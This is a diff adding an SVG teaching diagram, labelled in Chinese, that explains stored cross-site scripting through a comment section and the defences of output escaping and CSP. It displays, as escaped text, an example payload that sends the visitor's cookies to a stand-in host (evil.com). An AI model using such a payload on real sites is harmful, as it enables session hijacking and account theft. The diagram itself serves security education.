@@ -1,0 +1,46 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" font-family="monospace" font-size="14">
+<defs>
+  <filter id="pencil">
+    <feTurbulence type="fractalNoise" baseFrequency="0.04" numOctaves="3" result="noise" />
+    <feDisplacementMap in="SourceGraphic" in2="noise" scale="1.2" />
+  </filter>
+</defs>
+<rect width="800" height="500" fill="#F9F7F0" />
+<g stroke="#DDD6C0" stroke-width="1">
+  <line x1="0" y1="60" x2="800" y2="60" />
+  <line x1="0" y1="100" x2="800" y2="100" />
+  <line x1="0" y1="140" x2="800" y2="140" />
+  <line x1="0" y1="180" x2="800" y2="180" />
+  <line x1="0" y1="220" x2="800" y2="220" />
+  <line x1="0" y1="260" x2="800" y2="260" />
+  <line x1="0" y1="300" x2="800" y2="300" />
+  <line x1="0" y1="340" x2="800" y2="340" />
+  <line x1="0" y1="380" x2="800" y2="380" />
+  <line x1="0" y1="420" x2="800" y2="420" />
+  <line x1="0" y1="460" x2="800" y2="460" />
+</g>
+<line x1="60" y1="0" x2="60" y2="500" stroke="#D88A8A" stroke-width="2" />
+
+<text x="70" y="40" font-size="18" fill="#333" font-weight="bold">XSS 跨站脚本攻击</text>
+<rect x="80" y="80" width="120" height="50" rx="4" fill="none" stroke="#4A6FA5" stroke-width="2" />
+<text x="95" y="110" font-size="13" fill="#333">攻击者</text>
+<rect x="300" y="80" width="150" height="50" rx="4" fill="none" stroke="#D88A8A" stroke-width="2" />
+<text x="315" y="110" font-size="13" fill="#D88A8A">评论区留言</text>
+<rect x="550" y="80" width="150" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="2" />
+<text x="570" y="110" font-size="13" fill="#A56F4A">受害者浏览器</text>
+<line x1="200" y1="105" x2="300" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
+<text x="210" y="95" font-size="11" fill="#666">发恶意脚本</text>
+<line x1="450" y1="105" x2="550" y2="105" stroke="#666" stroke-width="1" marker-end="url(#arrow)" />
+<text x="460" y="95" font-size="11" fill="#666">其他人打开页面</text>
+<rect x="80" y="170" width="640" height="60" rx="4" fill="none" stroke="#D88A8A" stroke-width="1.5" />
+<text x="90" y="195" font-size="12" fill="#D88A8A" font-weight="bold">恶意留言内容：</text>
+<text x="90" y="220" font-size="12" fill="#333">&lt;script&gt;fetch('evil.com?cookie='+document.cookie)&lt;/script&gt;</text>
+<rect x="80" y="250" width="640" height="50" rx="4" fill="none" stroke="#A56F4A" stroke-width="1.5" />
+<text x="90" y="275" font-size="12" fill="#A56F4A" font-weight="bold">如果服务器不过滤直接展示：</text>
+<text x="90" y="295" font-size="12" fill="#333">浏览器把留言当HTML执行 → 偷Cookie → 劫持登录态</text>
+<rect x="80" y="320" width="640" height="70" rx="4" fill="none" stroke="#6B8E23" stroke-width="1.5" />
+<text x="90" y="345" font-size="12" fill="#6B8E23" font-weight="bold">防御：输出转义（HTML Entity Encode）</text>
+<text x="90" y="370" font-size="12" fill="#333">&lt; → &amp;lt;  &gt; → &amp;gt;  脚本变成文本不再执行</text>
+<text x="90" y="385" font-size="12" fill="#333">CSP策略：只允许加载指定域的脚本</text>
+<defs><marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L0,6 L9,3 z" fill="#666" /></marker></defs>
+</svg>
